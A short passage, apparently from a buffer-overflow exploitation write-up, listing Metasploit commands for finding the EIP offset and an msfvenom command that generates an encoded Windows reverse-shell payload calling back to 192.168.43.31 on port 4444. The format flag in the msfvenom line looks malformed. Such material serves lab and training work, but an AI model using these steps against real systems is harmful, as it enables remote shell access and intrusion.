...
Steps to create final payload:
```Bash
# offset discovery
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q [value in EIP]

# generate exploit code (reverse shell)
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.31 LPORT=4444 EXITFUNC=thread -f -c -e x86/shikata_ga_nai -b "bad_chars"
```
